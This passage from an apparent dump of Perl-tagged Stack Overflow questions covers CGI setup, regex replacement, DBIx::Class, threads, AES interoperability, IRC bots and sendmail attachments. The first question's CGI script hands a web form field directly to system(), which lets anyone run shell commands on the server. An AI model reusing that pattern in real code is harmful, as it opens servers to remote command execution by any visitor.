...</p>\n\n<p>Im on openSUSE 12.2 and my Apache server is running fine ... </p>\n\n<p>I copied the index.html which contains :</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" ?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\"&gt;\n&lt;head&gt;&lt;title&gt;Program 7b&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;form method=\"POST\" action=\"http://localhost/cgi-bin/7b.pl\"&gt;\n    Please Enter the Command :\n    &lt;input type=\"text\" name=\"command\" id=\"command\" /&gt;\n    &lt;input type=\"submit\" value=\"Submit\" /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>And the perl file as follows : </p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Content-type:text/html\\n\\n\";\nuse CGI\n\n$a = new CGI;\n$comm = $a-&gt;param(\"command\");\nprint \"The Output of the entered command is:&lt;br /&gt;\";\nsystem($comm);\n</code></pre>\n\n<p>Both files in the cgi-bin directory </p>\n\n<p>But i get the error :</p>\n\n<p>Premature end of script headers\nOn running localhost/cgi-bin/index.html in any browser .... </p>\n\n<p>I have set the execution of perl files in the apache configuration ... </p>\n\n<p>Kindly help with the problem ...</p>\n\n<p>Regards\n-SkyKOG</p>\n"},{"tags":["perl","directory","user-input","open"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12902784,"title":"Open files in specific directory based on inputed file name by user","body":"<p><p>I am trying to open a file located at <code>\\\\\\server\\folder\\folder\\folder\\filename.csv</code> based on user input for the file name.  The file will always be a csv file, but the name will be different based on departments.  The directory will always be the same, however it is not the directory Perl resides in.</p>\n\n<p>I have been having issues trying to open the file.  I have tried to make 2 variables, 1 for the directory and 1 for the file name, but I just get errors thrown when I try to open <code>$directory\\\\$FileName</code>.  I have tried to do an open statement with the directory hard coded in and the file name a variable, but Perl thinks the variable is part of the file name (which makes sense).  Is this even possible?</p>\n\n<p>After I have the file open, I have code to run which will edit the file itself (this works fine) and then I want to save the file in a new location.  This new location is the same as the directory, but I want to add another folder level to it and then the same file name.  Kind of a \"before change\" file location and an \"after change\" file location.<br><br></p>\n\n<pre><code>print \"What is your FULL file name going to be with extension included?\";\nmy $fileInName = &lt;&gt;; \nmy $@dirpath= '\\\\\\\\Server\\\\Folder1\\\\Folder2\\\\Folder3\\\\Folder4\\\\Sorted_files\\\\';\nmy $Excel = Win32::OLE-&gt;GetActiveObject('Excel.Application') || \n    Win32::OLE-&gt;new('Excel.Application', 'Quit'); \nmy $Book = $Excel-&gt;Workbooks-&gt;Open($directory $file); \nmy $Sheet = $Book-&gt;Worksheets(1);\n$Sheet-&gt;Activate(); \n</code></pre>\n\n<p>That is the code I have now.  I tried the following as well:</p>\n\n<pre><code>my $@dirpath= '\\\\\\\\server\\\\folder1\\\\folder2\\\\folder3\\\\call_folder4\\\\Sorted_files\\\\$fileName';\n</code></pre>\n\n<p>Of course I received the \"file cannot be found error:<br><br>\nMy file open works great if I hard code the entire path name, but I do not want to have 25 seperate scripts out there with the only difference being a file name.  Any suggestions would be appreciated.  Thank you!! </p>\n"},{"tags":["sql","perl","subquery","dbix-class"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":232,"score":1,"question_id":7760689,"title":"joining on a subquery with dbix-class?","body":"<p>Given two tables: (incoming greatly reduced/simplified example that exhibits the key problem)</p>\n\n<p><strong>app_data</strong> represents applications that can be subscribed to</p>\n\n<pre><code>id   app_name\n 1   apple\n 2   berry\n 3   cherry\n</code></pre>\n\n<p><strong>app_sub</strong> maps email addresses to applications</p>\n\n<pre><code>id   email\n 1   alex\n 2   bob\n 2   coby\n</code></pre>\n\n<p>I'd like to generate a table from a single-user point-of-view showing which applications the current user is subscribed to and not.</p>\n\n<p>For example, from Alex's perspective I'd like to get:</p>\n\n<p><strong>desired_table</strong></p>\n\n<pre><code>id    app_name    is_subscribed\n 1    apple       true\n 2    berry       false\n 3    cherry      false\n</code></pre>\n\n<p>The following pure SQL query seems to be fine:</p>\n\n<pre><code>select id, app_name, email\n  from app_data left join ( select *\n                              from app_sub\n                             where email='alex'\n                          ) as subquery\n                          on app_name.id=app_data.id;\n</code></pre>\n\n<p>However I'm having great difficulty getting that to work in dbix-class.</p>\n\n<p>Alternatively, I tried to eliminate the subquery like so:</p>\n\n<pre><code>$app_data_resultset-&gt;search( { -or =&gt; [ { email =&gt; 'alex' },\n                                        { email =&gt; undef },\n                                      ],\n                             },\n                             { select =&gt; [ qw{ me.id\n                                               me.app_name\n                                               app_sub.email\n                                             },\n                                         ],\n                               as =&gt; [ qw{ id\n                                           app_name\n                                           email\n                                         },\n                                     ],\n                               join =&gt; 'app_sub',\n                           );\n</code></pre>\n\n<p>However, this (now expectedly) results in the following (after treating both 0 and null as false):</p>\n\n<p><strong>bad_table</strong></p>\n\n<pre><code>id    app_name    is_subscribed\n 1    apple       true\n 3    cherry      false\n</code></pre>\n\n<p>Since 'bob' and 'coby' are subscribed to id 2, the where clause completely eliminates the second id.</p>\n\n<p>Any help would be greatly appreciated!</p>\n"},{"tags":["perl","perforce"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12902824,"title":"Perforce script to sync large amounts of data","body":"<p>How do you keep an area of the filesystem synced with perforce from cron?</p>\n\n<p>I'm working on a perl script to do this. It runs out of cron every two minutes so it needs to be efficient. </p>\n\n<p>Trying to run a single sync from the root dir of this area pops the \"request too large for server memory\" error, so I've had to use perl's find function to go through the directory structure and recurse where the directory is larger than a certain size. When it reaches a directory under the size, it runs a p4 sync on that dir. The problem this creates is that if a directory is created in perforce, it may not get synced to the filesystem. For example, if the new directory is in a directory that is too large to sync.</p>\n\n<p>Hope this makes sense and I can provide code samples if you need it. </p>\n"},{"tags":["c#","java","c","perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":135,"score":-5,"question_id":12902744,"title":"Which programming languages can talk to Cisco Routers?","body":"<p>I would like to know about the programming languages that can communicate with Routers(cisco routers). For an instance, issuing a command \"show run\" to router from pc that is connected to router. and as well as the result should be executed in the program execution console what ever the 'show run' displays in the router</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12897947,"title":"Correct quoting in Perl OpenSSH module to parse an MySQL command","body":"<p>I am using the <a href=\"http://search.cpan.org/~salva/Net-OpenSSH-0.57/lib/Net/OpenSSH.pm\" rel=\"nofollow\">Net::OpenSSH Perl</a> module to connect to an SSH server and perform the following code:</p>\n\n<pre><code>my @cmd = 'mysql -e \"SET GLOBAL general_log_file = $log\"';\n$ssh-&gt;system(@cmd);\n</code></pre>\n\n<p>Here is the correct shell command:</p>\n\n<pre><code>mysql -e \"SET GLOBAL general_log_file = 'log_name'\"\n</code></pre>\n\n<p>I am getting the following error:</p>\n\n<pre><code>ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1\n</code></pre>\n\n<p>You see that my problem is how to parse the variable correctly. </p>\n\n<p>Could you please help me to correct the quoting? I have already tried all possible variants.</p>\n\n<p>Thank you.</p>\n"},{"tags":["regex","perl","file-io"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":103,"score":-1,"question_id":12902093,"title":"Perl Regex match works, but replace does not","body":"<p>I have put together a Perl script to go through a directory and match various keys in the source and output the results to a text file. The match operation works well, however the end goal is to perform a replace operation. The Perl script is as follows:</p>\n\n<pre><code>  #!/usr/bin/perl\n  #use strict;\n  use warnings;\n\n  #use File::Slurp;\n\n  #declare variables\n  my $file = '';\n  my $verbose = 0;\n  my $logfile;\n\n  my @files = grep {/[.](pas|cmm|ptd|pro)$/i} glob 'C:\\users\\perry_m\\desktop\\epic_test\\pascal_code\\*.*';\n\n  #iterate through the files in input directory\n  foreach $file (@files) {\n\n     print \"$file\\n\";\n\n     #read the file into a single string\n     open FILEHANDLE, $file or die $!;\n     my $string = do { local $/; &lt;FILEHANDLE&gt; };\n\n     #perfrom REGEX on this string\n\n     ########################################################\n     #fix the include formats to conform to normal PASCAL\n     $count = 0;\n     while ($string =~ m/%INCLUDE/g)\n     {\n        #%include\n        $count++;\n     }\n     if ($count &gt; 0)\n     {\n        print \" $count %INCLUDE\\n\";\n     }\n     $count = 0;\n     while ($string =~ m/INCLUDE/g)\n     {\n        #%INCLUDE;\n        $count++;\n     }\n     if ($count &gt; 0)\n     {\n        print \" $count INCLUDE\\n\";\n     }\n     $count = 0;\n     while ($string =~ m/(%include\\s+')[A-Za-z0-9]+:([A-Za-z0-9]+.[A-Za-z]+')/g)\n     {\n        #$1$2;\n        $count++;\n     }\n     if ($count &gt; 0)\n     {\n        print \" $count XXXX:include \\n\";\n     }        \n  }\n</code></pre>\n\n<p>This produces output as desired, an example is below:</p>\n\n<pre><code>  C:\\users\\perry_m\\desktop\\epic_test\\pascal_code\\BRTINIT.PAS\n   1 INCLUDE\n   2 XXXX:include \n   39 external and readonly\n</code></pre>\n\n<p>However if I change the regex operations to try and implement a replace, using the replacement operation shown in the commented lines above, the scripts hangs and never returns. I imagine it is somehow related to memory, but I am new to Perl. I was also trying to avoid parsing the file by line if possible.</p>\n\n<p>Example:</p>\n\n<pre><code>  while ($string =~ s/%INCLUDE/%include/g)\n  {\n     #%include\n     $count++;\n  }\n</code></pre>\n\n<p>and</p>\n\n<pre><code>  while ($string =~ s/(%include\\s+')[A-Za-z0-9]+:([A-Za-z0-9]+.[A-Za-z]+')/$1$2;/g)\n  {\n     #$1$2;\n     $count++;\n  }\n</code></pre>\n\n<p>Edit: simplified the examples</p>\n"},{"tags":["multithreading","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12845498,"title":"How can I create a thread wthout it running right away?","body":"<p>Consider the following code:</p>\n\n<pre><code>for (my $i = 0; $i &lt; $threadCount; $i++) {\n\n    if($isResumed) {\n\n        # TODO: load stats from DB      \n    }\n    else {\n\n        $stats-&gt;{workers}-&gt;{$i}        = &amp;share({});            \n        $stats-&gt;{workers}-&gt;{$i}-&gt;{tid} = undef; \n        $stats-&gt;{workers}-&gt;{$i}-&gt;{foo} = \"bar\";\n        $stats-&gt;{workers}-&gt;{$i}-&gt;{abc} = 123;                               \n    }\n\n    # create the worker thread\n    my $thr = threads-&gt;create(\\&amp;worker);    \n    # TODO: find a way to store the TID in the $i slot. why have two differetn IDs? \n    $stats-&gt;{workers}-&gt;{$i}-&gt;{tid} = $thr-&gt;tid();\n}\n</code></pre>\n\n<p>I am using the $stats hash to hold data that should be shared between threads, as well as data about what each thread is doing. The problem I have is that I would like to reference the thread data in this hash based on the TID, not an arbitrary value assigned by $i in the loop. </p>\n\n<p>When I create the thread, the work starts immediately, but it cannot start its work until the hash values are set. So, if I do:</p>\n\n<pre><code>$thr = threads-&gt;create(\\&amp;worker);\n$stats-&gt;{workers}-&gt;{$thr-&gt;tid()} = &amp;share({});\n</code></pre>\n\n<p>It will not work because not all the data it needs is set yet.</p>\n\n<p>So basically, is there a way for me to create a thread, but defer it from running its code until I specifically tell it to? Something like:</p>\n\n<pre><code>$thr = threads-&gt;create(\\&amp;worker);\n$stats-&gt;{workers}-&gt;{$thr-&gt;tid()} = &amp;share({});\n$thr-&gt;start();\n</code></pre>\n"},{"tags":["perl","soap","wsdl","http-request"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":365,"score":2,"question_id":10380873,"title":"Perl: Getting complete request from SOAP::WSDL object","body":"<p>I'm working with <code>SOAP::WSDL</code> and another company's custom WSDL file. Every time they make a change for me and I recreate my modules, something breaks. Finding the problem is rather tedious because I don't find a proper way to access the actual request that is sent to the SOAP server.</p>\n\n<p>The only way to get to the request so far has been to use tcpdump in conjunction with wireshark to extract the request and result. That works, but since I don't have root privileges on the dev machine I have to get an admin over every time I want to do that. I feel there must be another way to get to the <code>HTTP::Request</code> object inside the <code>SOAP::WSDL</code> thing. But if the server returns a fault, I don't even have a response object, but rather a <code>SOAP::WSDL::SOAP::Typelib::Fault11</code> object that has no visible relation to the request.</p>\n\n<p>I've also tried using the debugger but I'm having trouble finding the actual request part. I've not yet understood how to tell the debuger to skip to a specific part deep inside a complex number of packages.</p>\n"}]}
{"total":22324,"page":9,"pagesize":100,"questions":[{"tags":["regex","perl","regex-negation","regex-lookarounds"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12901944,"title":"Is there a way to do a negative match on a string using a positive match regex operator?","body":"<p>Specifically, is there a way to achieve the equivalent of</p>\n\n<pre><code>my $string = 'this is some example text';\nmy $match = qr/foobar/;\nprint 'success' if $string !~ $match;\n</code></pre>\n\n<p>By using only =~, and no negation operators?</p>\n\n<p>Specifically, I need to ensure a string does NOT match a <em>supplied</em> value, and the testing function takes regex objects, and applies them positively to the value.  <em>The value must not occur in the searched string at all</em>, complicating look-ahead and look-behind assertions.</p>\n\n<p>Something like the following might be a good test:</p>\n\n<pre><code>my $string = 'this is some example text';\nmy $match =~ qr/foobar/;\n# $negated_match contains $match, or some transformed variation of it\nmy $negated_match = qr/$YOUR_REGEX_HERE/; \ndie 'failure' if $string =~ $match;\nprint 'success' if $string =~ $negated_match;\n</code></pre>\n\n<p>I suspect there's a way to do this with look-around assertions, but haven't puzzled it out yet.  A perl specific answer is acceptable.</p>\n"},{"tags":["ruby","perl","encryption","aes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":113,"score":-2,"question_id":12900816,"title":"Perl AES vs Ruby AES","body":"<p>I cannot get Perl and Ruby to agree on CBC AES:</p>\n\n<p><strong>Perl</strong></p>\n\n<pre><code>use Crypt::CBC;\nuse MIME::Base64::Perl;\n\nmy $cipher = Crypt::CBC-&gt;new(\n        -key         =&gt; 'd2cb415e067c7b13',\n        -iv          =&gt; 'e36dc751d0433f05', #random 16chars!!!!!! shold NOT repeat between requests\n        -cipher      =&gt; 'OpenSSL::AES',     #this is same as Rijndael\n        -literal_key =&gt; 1,        \n        -header      =&gt; \"none\",\n        -keysize     =&gt; 16\n  );  \n\n$encypted = $cipher-&gt;encrypt(\"a really really long long text has differrent results???\");\n$base64 = encode_base64($encypted);\n\nprint(\"Ciphertext(b64): $base64\");\n\n$de_base64 = decode_base64($base64);\n$decrypted = $cipher-&gt;decrypt($de_base64);\n$c = $cipher-&gt;finish;\n</code></pre>\n\n<blockquote>\n  <p>Ciphertext(b64): qz4eSQaFkQUkDOyJSbZf5W03HoldwtgvTLq0yJFRViKJnytf3PVSCGW2CYDjO+tRqV20oxeB2VPa\n  7NqN1TDSNQ==</p>\n</blockquote>\n\n<p>there's a newline after the <code>2VPa</code> section and another at the end</p>\n\n<p><strong>Ruby</strong></p>\n\n<pre><code>require 'openssl'\nrequire 'digest/sha2'\nrequire 'base64'\n\nmessage = \"a really really long long text has differrent results???\" \ncipher = OpenSSL::Cipher.new('aes-128-cbc')\n\n# digest the key, iv and hmac_key so we have 16-byte length \n# also, it looks more of a funky password\n# prepare cipher\ncipher.encrypt\ncipher.key = aes_key = \"d2cb415e067c7b13\"\ncipher.iv = aes_iv = \"e36dc751d0433f05\"\n\n\nencrypted = cipher.update(message)\nencrypted &lt;&lt; cipher.final()\nb64_encoded = Base64.encode64(encrypted).encode('utf-8') #strict_encode64 guarantees no newlines, encode64 is default\n\nputs \"AES Key        : '#{aes_key}'\"\nputs \"AES IV         : '#{aes_iv}'\"\nputs \"Ciphertext(b64): '#{b64_encoded}'\"\n</code></pre>\n\n<blockquote>\n  <p>Ciphertext(b64): 'qz4eSQaFkQUkDOyJSbZf5W03HoldwtgvTLq0yJFRViKJnytf3PVSCGW2CYDj\n  O+tRqV20oxeB2VPa7NqN1TDSNQ==\n  '</p>\n</blockquote>\n\n<p>Note the <code>newlines</code> chars after <code>CYDj</code> and after <code>==</code></p>\n\n<p>I've seen the following: <a href=\"http://stackoverflow.com/questions/1628566/perl-ruby-exchange-aes-encrypted-information\">Perl &amp; Ruby exchange AES encrypted information</a>, but I'm not using <code>padding=0</code></p>\n"},{"tags":["perl","irc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12884311,"title":"How do I issue a quit message with perl's POE::Component::IRC?","body":"<p>I have a simple IRC bot using POE::Component::IRC. It was only when I was attempting to make it gracefully handle SIGINT by quitting with a useful message that I found that I can't make it quit with any message at all, ever whether as part of a signal handler or just a normal call to quit.</p>\n\n<p>Let's say I've got the session created something like this:</p>\n\n<pre>\nPOE::Session->create(\n        inline_states => {\n                irc_disconnected => \\&bot_reconnect,\n                irc_error        => \\&bot_reconnect,\n                irc_socketerr    => \\&bot_reconnect,\n                connect          => \\&bot_reconnect,\n.\n.\n.\n        },\n);\n</pre>\n\n<p>And <code>bot_reconnect</code> is just going to connect back to IRC should\nanything go wrong:</p>\n\n<pre>\nsub bot_reconnect\n{\n        my ($kernel, $heap) = @_[KERNEL, HEAP];\n\n        if (1 == $heap->{shutting_down}) {\n                $heap->{irc}->yield(shutdown => 'blah');\n        } else {\n                some_log_func(\"Reconnecting in 60 secs\");\n                $kernel-delay(connect => 60);\n        }\n}\n</pre>\n\n<p>If, anywhere else in the code I set <code>shutting_down</code> to 1 and tell it\nto quit (e.g.  <code>$irc-&gt;yield(quit =&gt; \"bye!\")</code>) it immediately quits\nIRC with either no quit message (\"Client Quit\", the ircd displays)\nor else with \"Remote host closed the connection\".</p>\n\n<p>It then receives the <code>irc_disconnected</code> event which takes it to\n<code>bot_reconnect</code> above, where <code>shutdown</code> appears to do nothing at\nall. In fact if I don't explicitly <code>exit 0</code> after that <code>shutdown</code>\nthen the process just stays in limbo with no connect to IRC any\nmore.</p>\n\n<p>Is that what is supposed to happen?</p>\n\n<p>I found:</p>\n\n<p><a href=\"http://search.cpan.org/~bingos/POE-Component-IRC-6.79/lib/POE/Component/IRC/Cookbook/Disconnecting.pod\" rel=\"nofollow\">http://search.cpan.org/~bingos/POE-Component-IRC-6.79/lib/POE/Component/IRC/Cookbook/Disconnecting.pod</a></p>\n\n<p>which says to use <code>shutdown</code>. As you can see, I tried that, and it\ndoesn't seem to work.</p>\n\n<p>I also found some sample code for this in another question:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/2471373/how-do-i-correctly-shutdown-a-botbasicbot-bot-based-on-poecomponentirc\">How do I correctly shutdown a Bot::BasicBot bot (based on POE::Component::IRC)?</a></p>\n\n<p>However that is very similar to what I have now, and it also doesn't\nseem to behave any differently.</p>\n\n<p>The package version of <code>libpoe-component-irc-perl</code> is 6.78+dfsg-1 so\nthat should be greater than 6.50 as the above URL says.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["perl","html-entities","decoding"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12897203,"title":"Character Encoding Issues, Unable to decode HTML entities using PERL APIs","body":"<p>I am going nuts with the Encoding schemes now. I will state my problem below, please give your inputs.</p>\n\n<p>Problem : I have some input string as mentioned in code below. The final desired output is \"KÅiÅ¾ovnickÃ¡ 190\".[ You can decode it <a href=\"http://htmlentities.net/\" rel=\"nofollow\">here</a> ]. I am using perl modules to decode these kind of strings. Following is my test code :</p>\n\n<pre><code>use HTML::Entities;\nbinmode STDOUT,\":utf8\";\n$a = \"K&amp;#345;i&amp;#158;ovnick&amp;aacute; 190\";\ndecode_entities($a);\nprint $a.\"\\n\";\n</code></pre>\n\n<p>However the output, I am getting is \"KÅiovnickÃ¡ 19\" which means that \"&#345;\" is decoded properly, but \"&#158;\" is not. My question is WHY? I then tried \"_decode_entities\" method where we supply entity2char hash, but still no success. </p>\n\n<p>PS : I am bound to use Perl here, because of other legacy APIs, please help me here</p>\n"},{"tags":["perl","installation","module"],"answer_count":5,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":2066,"score":7,"question_id":2292946,"title":"How can I load a Perl module at runtime?","body":"<p>I would like to use the HTML::Template module.  However, it is not installed on the server I'm using to develop CGI scripts.</p>\n\n<p>Is it possible to load a module at runtime:  I found the Template.pm file on my local Perl installation and uploaded the file to the server I'm using.</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse CGI qw(:standard :html4);\nuse CGI::Carp qw(warningsToBrowser fatalsToBrowser);\n\n# use HTML::Template;\n\nuse Template;\n\n# my $package = \"HTML::Template\";\n# eval {\n# (my $pkg = $package) =~ s|::|/|g; # require need a path\n# require \"$pkg.pm\";\n# import $package;\n# };\n# die $@ if( $@ );\n\n# open the HTML template\nmy $template = HTML::Template-&gt;new(filename =&gt; 'test.tmpl');\n\n# fill in some parameters in the template\n$template-&gt;param(home =&gt; $ENV{HOME});\n$template-&gt;param(path =&gt; $ENV{PATH});\n\n# send the obligatory Content-Type\nprint \"Content-Type: text/html\\n\\n\";\n\n# print the template\nprint $template-&gt;output;\n</code></pre>\n"},{"tags":["perl","permissions","file-permissions","readonly"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1184,"score":2,"question_id":3738295,"title":"How do I recursively set read-only permission using Perl?","body":"<p>I would like <code>$dir</code> and everything underneath it to be read only. How can I set this using Perl?</p>\n"},{"tags":["xml","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2854,"score":2,"question_id":657058,"title":"How do I retrieve tag attributes with XML::Simple?","body":"<p>I am simply trying to retrieve an attribute from XML into my Perl program.  However, I am having problems retrieving attributes. </p>\n\n<p>I am using <a href=\"http://search.cpan.org/dist/XML-Simple\" rel=\"nofollow\">XML::Simple</a>.</p>\n\n<p>I can recover information fine when XML is like this:</p>\n\n<pre><code>&lt;IdList&gt;\n    &lt;Id&gt;17175540&lt;/Id&gt;\n&lt;/IdList&gt;\n</code></pre>\n\n<p>by using this code</p>\n\n<pre><code> $data-&gt;{'DocSum'}-&gt;{'Id'};\n</code></pre>\n\n<p>However, when the XML is like this:</p>\n\n<pre><code>&lt;Item Name=\"Title\" Type=\"String\"&gt;\n    Some Title\n&lt;/Item&gt;\n</code></pre>\n\n<p>I am not getting any data back when using the following code</p>\n\n<pre><code>$data-&gt;{'DocSum'}-&gt;{'Title'};\n</code></pre>\n\n<p>BTW, this is the link I am getting the XML from <a href=\"http://eutils.ncbi.nlm.nih.gov/entrez/eutils/esummary.fcgi?db=pubmed&amp;id=19288470\" rel=\"nofollow\">http://eutils.ncbi.nlm.nih.gov/entrez/eutils/esummary.fcgi?db=pubmed&amp;id=19288470</a></p>\n"},{"tags":["perl","makefile","make"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":2,"view_count":616,"score":2,"question_id":2127256,"title":"How do I run a Perl one liner from a makefile?","body":"<p>I know the perl one liner below is very simple, works and does a global substitution, A for a; but how do I run it in a makefile?</p>\n\n<pre><code>perl -pi -e \"s/a/A/g\" filename\n</code></pre>\n\n<p>I have tried (I now think the rest of the post is junk as the shell command does a command line expansion - NOT WHAT I WANT!) The question above still stands!</p>\n\n<pre><code>APP = $(shell perl -pi -e \"s/a/A/g\" filename)\n</code></pre>\n\n<p>with and without the following line</p>\n\n<pre><code>EXE = $(APP)\n</code></pre>\n\n<p>and I always get the following error</p>\n\n<pre><code>make: APP: Command not found\n</code></pre>\n\n<p>which I assume comes from the line that starts APP</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":45,"score":-3,"question_id":12892092,"title":"How to convert xml to idml","body":"<p>I want convert xml to idml file using by perl script.</p>\n\n<p>XML: </p>\n\n<pre><code> &lt;?xml version=\"1.0\"?&gt;\n     &lt;catalog&gt;\n         &lt;book id=\"bk101\"&gt;\n             &lt;author&gt;Gambardella, Matthew&lt;/author&gt;\n             &lt;title&gt;XML Developer's Guide&lt;/title&gt;\n             &lt;genre&gt;Computer&lt;/genre&gt;\n             &lt;price&gt;44.95&lt;/price&gt;\n             &lt;publish_date&gt;2000-10-01&lt;/publish_date&gt;\n             &lt;description&gt;An in-depth look at creating applications with XML.&lt;/description&gt;\n         &lt;/book&gt;\n     &lt;/catalog&gt;\n</code></pre>\n\n<p>please if any module for idml let me know.</p>\n"},{"tags":["php","perl","x509","smartcard"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":90,"score":3,"question_id":12868883,"title":"php/perl or other web script capable of automatic authentication to a SmartCard Enabled Website","body":"<p>I have a php script that goes to a rss feed url and pulls down the xml, processes it and then loads the data I need into a database.  The script has been working flawlessly, until the site owners secured it using smartcard authentication(Military CAC).  </p>\n\n<p>I've been trying to figure out a way to take my x.509 cert from my smartcard and present it via php or any other scripting language to the webserver hosting the rss.  I can't see to figure this out.  </p>\n\n<p>Concept of operations:\n1. Request rss url\n2. rss url requests authentication\n3. present cert + pin(I'll store the pin securely for the script to use, I know how to do this)\n4. rss url authenticates my cert and posts the data.</p>\n\n<p>Thanks!\n-Dan</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":2,"view_count":76,"score":1,"question_id":12899757,"title":"Getting wrong results with Perl subroutine","body":"<p>I have a test file that looks like this:</p>\n\n<pre><code>my $int = new Services::Plugins::FTP::ftp;\n$int-&gt;AddUser(\"durr\");\n</code></pre>\n\n<p>The module has this code:</p>\n\n<pre><code>sub AddUser {\n\nmy( @username ) = @_;\nprint \"@_\\n\";  \n\n}\n</code></pre>\n\n<p>But my results looks like:\n    Services::Plugins::FTP::ftp=HASH(0x2490160)durr</p>\n\n<p>I just want 'durr'.</p>\n\n<p>Why am I getting the extra stuff?</p>\n"},{"tags":["javascript","perl","web-scraping"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12899721,"title":"Executing all JavaScript page using perl","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1392005/how-can-i-get-dynamically-web-content-using-perl\">How can I get dynamically web content using Perl?</a>  </p>\n</blockquote>\n\n\n\n<p>I've been reviewing ways to get javascript to execute on webpages but don't fully understand some of the solutions.</p>\n\n<p>I'm going to use TechCrunch as an example. If you check out an article on TechCrunch, you'll see at the top of each page, they have a visual to show how many tweets, likes, comments, have been done for that page. If I wanted to scrape this page and gather that information, is there a solution for this in perl?</p>\n\n<p>I've looked at the WWW::Scripter and the WWW::Mechanize::Plugin::JavaScript. Possibly it's because I don't fully understand what is provided with them. But is there a way for me to pass in a URL and have it run the javascript on the page, as a browser would, without having to pass variables, or anything else special to get it to execute.</p>\n"},{"tags":["perl","truncate","wrap","cut"],"answer_count":9,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":2001,"score":6,"question_id":137313,"title":"Truncate stdin line length?","body":"<p>I've been parsing through some log files and I've found that some of the lines are too long to display on one line so Terminal.app kindly wraps them onto the next line. However, I've been looking for a way to truncate a line after a certain number of characters so that Terminal doesn't wrap, making it much easier to spot patterns.</p>\n\n<p>I wrote a small Perl script to do this:</p>\n\n<pre><code>#!/usr/bin/perl\n\ndie(\"need max length\\n\") unless $#ARGV == 0;\n\nwhile (&lt;STDIN&gt;)\n{\n    $_ = substr($_, 0, $ARGV[0]);\n    chomp($_);\n    print \"$_\\n\";\n}\n</code></pre>\n\n<p>But I have a feeling that this functionality is probably built into some other tools (sed?) that I just don't know enough about to use for this task.</p>\n\n<p>So my question sort of a reverse question: how do I truncate a line of stdin WITHOUT writing a program to do it?</p>\n"},{"tags":["perl","class","inheritance","oo"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12882554,"title":"How to call a class:method determined at runtime in perl?","body":"<p>I am trying to make a crm application with a lot of crud actions. So I have controller classes like</p>\n\n<pre><code>CRM::Cities\nCRM::Countries\n</code></pre>\n\n<p>No I use ORLite as a lite weight ORM. It creates -on the fly- classes like so</p>\n\n<pre><code>Model::Cities\nModel::Countries\n</code></pre>\n\n<p>Now say I want to load a city. In the CRM::Cities class I have to do something like \n(ORLite uses class methods for access)</p>\n\n<pre><code>$obj1 = Model::Cities-&gt;load($id);\n</code></pre>\n\n<p>To load the current country in CRM::Countries:</p>\n\n<pre><code>$obj1 = Model::Countries-&gt;load($id);\n</code></pre>\n\n<p>So I end up in each controller class to enclose similar lines. </p>\n\n<p>What I would want to be able todo is to do something generic like this in the CRM package (the base controller class):</p>\n\n<pre><code>$obj1 = Model::$package-&gt;load($id);\n# package contains Cities or Countries, determined at runtime\n</code></pre>\n\n<p>I tried with various variations , with eval and so on but this is higher order perl. I think b/c the ORLite methods are class methods, inheritance is less obvious. Can someone give advice?  tia !</p>\n"},{"tags":["perl","email-attachments"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12894782,"title":"Perl Email attachment using Sendmail with out any Perl modules like (MIME::Lite .etc )","body":"<p>I have a file called 'test.txt',which I want to send it as an email attachment also want the contents in Email Message body. (I want to achieve with sendmail with out using any Perl modules Like MIME::Lite .etc.)I could manage to write a Perl script with till here ,which will paste the content in the email body.Please help me to make the same file also an attachment in same email.</p>\n\n<pre><code>here is the code\n\n#!/usr/bin/perl\nuse strict;\nuse warnings;\n\n$title='Test';\n$to='test@mydomain.com';\n$from= 'test@example.com';\n$subject='Test mail';\nmy $file = \"test.txt\";\n\nopen(MAIL, \"|/usr/sbin/sendmail -oi -t 